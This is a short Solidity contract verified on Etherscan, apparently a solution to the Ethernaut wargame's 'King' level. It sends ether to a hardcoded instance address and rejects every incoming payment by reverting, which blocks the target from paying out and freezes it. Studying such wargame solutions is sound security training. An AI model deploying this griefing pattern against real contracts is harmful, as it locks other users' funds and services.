/**
 *Submitted for verification at Etherscan.io on 2022-02-23
*/

// SPDX-License-Identifier: GPL-3.0


pragma solidity >=0.8.0;

contract EthernautHack {

    address payable instanceAddress = payable(0x64705df8f288b4907Bd6E7Bd6A39129049E76dD8); 

    constructor() public payable {

    }

    function hack() public payable {
        instanceAddress.call{value : msg.value}("");
    }
    receive() external payable {
        revert("failed the transaction");
    }
}